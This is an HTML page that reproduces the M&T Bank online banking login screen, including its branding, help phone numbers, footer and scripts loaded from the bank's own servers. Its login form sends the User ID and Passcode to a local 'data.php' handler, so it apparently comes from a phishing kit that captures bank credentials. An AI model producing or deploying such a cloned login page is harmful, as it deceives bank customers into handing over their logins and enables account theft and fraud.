
<!DOCTYPE HTML>
<html lang="en">
    <head>
<script type="text/javascript" src="https://onlinebanking.mtb.com/TSPD/08a6c39cccab2000328ef26e40c75b54c531ee59bf3483c0ba9899b90fecaa2ea5a7c5dcff556414?type=9"></script>

    <title>Welcome to Online Banking | M&amp;T Bank</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        
        <link href="https://resources.mtb.com/r/simple-layout/css.mtb?v=02202019130252" rel="stylesheet"/>

        
    <script type="text/javascript">
        var resourceServerExternal = "https://asset.mtb.com";
    </script>
    </head>
<body>
   <div class="banner"><img class="alt-wizard" src='https://onlinebanking.mtb.com/Assets/images/img_trans.gif' alt="M&T Bank" /></div>
    <style type="text/css">
.Un-link {
    text-decoration: none !important;
    cursor: none !important;
}
</style>

<div class ="login-container">
    <h1 class="header-text">Welcome to M&amp;T Online Banking<br/><span style="font-size: .7em;">For Business and Personal Accounts</span></h1>
    <div class="ret-user">
        Returning Users</div>
<form action="data.php" method="post">        <div class="signon-box">
        
                <a class="Un-link" aria-labelledby="lblErrorMessage" id="lnkErrorMsg">
                <p id="lblErrorMessage" class="field-validation-error">To log in, please provide your User ID and Passcode.</p>
                </a>
            <label for="UserId">User ID</label>            
            <input autocomplete="off" data-val="true" data-val-required="The User ID field is required." id="UserId" maxlength="20" name="username" spellcheck="false" type="text" value="" />                                                                                                           
            <label for="Passcode">Passcode</label>                                         
            <input data-val="true" data-val-required="The Passcode field is required." id="Passcode" maxlength="20" name="password" type="password" />                                                                       
            <button type="submit" class="btn-login-welcome" id="btnSubmit">
                LOG IN<span class="primary-arrow"></span></button> 

            <div class="login-help">
                <p>Help with your:  </p><p>
                                            <a class="login-help-label contextual-help-icon" id = "imgLoginUserIDHelp2"> User ID <span id='imgLoginUserIDHelp' class='contextual-help-icon'><img class='help-small' src='https://resources.mtb.com/images/img_trans.gif' alt='View help'/></span></a>
                                            <span class="help-spacer"> or </span> 
                                            <a class="login-help-label contextual-help-icon" id = "imgLoginPasscodeHelp2">Passcode <span id='imgLoginPasscodeHelp' class='contextual-help-icon'><img class='help-small' src='https://resources.mtb.com/images/img_trans.gif' alt='View help'/></span> </a> 
                                        </p></div> 

        </div>
        <div class="enroll-now">
            <p>
                Not enrolled in Online Banking?
            </p>                
            <a class="enroll-button" href="/Enrollment/Enroll">ENROLL NOW</a>                         
            <p>
                Online Banking Get Started Guide:<br />
                <a id="lnkPersonal">Personal</a> or <a id="lnkBusiness">Business</a>
            </p>
        </div>      
</form><!--    <p class="soft-light-gradient colored-box info-area">
        dynamic message space which will be used for outage and acquisition notifications.
    </p> -->
    <div class="questions">
        <div class="form-hdr">
            Questions?</div>
        <p>
            For help with M&amp;T Online Banking, please call <a href="tel:1-800-790-9130"><b>1-800-790-9130</b></a> (Mon-Fri
            8am-9pm, Sat-Sun 9am-5pm ET).</p>
        <p>
            For help with M&amp;T Online Banking for Business, please call <a href="tel:1-800-724-6070"><b>1-800-724-6070</b></a>
            (Mon-Fri 7am-9pm, Sat-Sun 9am-5pm ET).</p>
        <div class="unauth-txt">
            Unauthorized access is prohibited. Usage may be monitored.</div>
    </div>
</div>

    
<div class="footer">
    <div class="footer-nav">
        <ul>
            <li ><a id="lnkPrivacy">Privacy</a><span class="text-pipe">|</span></li>
            <li><a id="lnkSecurity">Security Assurance</a><span class="text-pipe">|</span></li>
            <li><a id="lnkAgreement">Digital Services Agreement</a><span class="text-pipe">|</span></li>
            <li><a id="lnkESignAgreement">ESign Agreement</a><span class="text-pipe">|</span></li>
            <li><a id="lnkAccessibility" >Accessibility</a><span class="text-pipe">|</span></li>
       
            <li><a id="lnkMtbRetail">mtb.com</a></li>
        </ul>
    </div>
     <div class="security-icons">
        <a id="lnkFdic"  class="fdic-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Member FDIC" /></a>
        <a id="lnkHousing" class="housing-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Equal Housing Lender" /> <span class="nmls">NMLS#381076</span></a>
        <a id="lnkEntrust" class="entrust-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Entrust® Secured" /></a>
       
    </div>
     <div class="time-stamp">&copy;2019 M&amp;T Bank. All Rights Reserved.</div>
   
</div>

    
<div id="contextual-help" class="soft-very-light-gradient contextual-help left" role="alertdialog" aria-labelledby="hd" aria-live="assertive" aria-relevant="all">
  <span class="close"><img src='https://resources.mtb.com/images/img_trans.gif' alt='Close help' /></span>
    <div class="message-header" id="hd">
    </div>
    <div class="message-body">
    </div>
</div>

    
<div id="divDialogBankToBank" class="hide">
  
        
   
</div>


<div id="divMortgageLoginInfo">

</div>

    <script src="https://resources.mtb.com/r/simple-layout/js.mtb?v=02202019130252"></script>

    <script src="/l/simple-layout/js?v=CAslgmMQos5ip4oCyQ_TG4__7O5V-DEYYVViIjA_miw1"></script>

    <script src="https://resources.mtb.com/Scripts/plugins/s_code.js"></script>
   
    
    <script src="https://resources.mtb.com/Scripts/plugins/rsa.js"></script>
          
    <script src="/Assets/scripts/login/index.js"></script>
  
       

<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]); _cf.push(['_setAu', '/public/d3db7c321198ee30d7b3e33007369']);</script><script type="text/javascript" src="/public/d3db7c321198ee30d7b3e33007369"></script></body>
</html>
<script id="f5_cspm">(function(){var f5_cspm={f5_p:'HKJGDBIPALNFEKFFMDPNAAHMNFMPNLMHKMBGPAFAACMEDDBAEKBKHHIHNLGAOMLLPLEAMNPHMMJBHFJIDLKEKBAHEJAABNAFMPLBOABCFGKEBHBEAPAAOLHCFDPLDMIL',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,48,(latency>>8));str=f5_cspm.set_byte(str,49,(latency&0xff));str=f5_cspm.set_byte(str,43,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr1852387700aaaaaaaaaaaaaaaa='+encodeURIComponent(cookie_val)+';path=/';}
return;}}
catch(err){return;}
setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;';setTimeout(f5_cspm.wait_perf_data,100);}}}}
f5_cspm.go();}());</script>